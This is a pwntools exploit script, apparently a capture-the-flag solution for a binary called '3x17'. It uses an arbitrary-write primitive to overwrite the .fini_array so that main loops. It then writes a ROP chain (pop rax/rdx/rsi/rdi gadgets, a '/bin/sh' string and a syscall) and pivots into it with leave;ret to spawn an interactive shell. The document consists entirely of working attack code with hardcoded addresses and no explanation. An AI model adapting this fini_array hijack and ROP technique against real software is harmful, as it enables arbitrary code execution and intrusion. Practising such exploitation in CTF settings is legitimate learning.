from pwn import *

r = process("./3x17")
gdb.attach(r,api=True)
def write(addr, data):
    r.recvuntil(b'addr:')
    r.sendline(str(addr))
    r.recvuntil(b'data:')
    r.send(data)

fini_array_addr = 0x4b40f0
fini_array_caller = 0x402960
main_addr = 0x401b6d
leave_ret = 0x401c4b
syscall = 0x4022b4
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rax = 0x41e4af
pop_rdx = 0x446e35
bin_sh = fini_array_addr + 88

#0x0000000000442110 : xor rax, rax ; re

write(fini_array_addr + 00, p64(fini_array_caller) + p64(main_addr))
log.info("loop started...")
write(fini_array_addr + 16, p64(pop_rax)           + p64(0x3b))
log.info("pop rax")
write(fini_array_addr + 32, p64(pop_rdx)           + p64(0))
log.info("pop rdx")
write(fini_array_addr + 48, p64(pop_rsi)           + p64(0))
log.info("pop rsi")
write(fini_array_addr + 64, p64(pop_rdi)           + p64(bin_sh))
log.info("pop rdi")
write(fini_array_addr + 80, p64(syscall)           + b'/bin/sh\x00')
log.info("syscall")

write(fini_array_addr, p64(leave_ret)  + p64(0x0000000000442110)) ##haizz :(
r.interactive()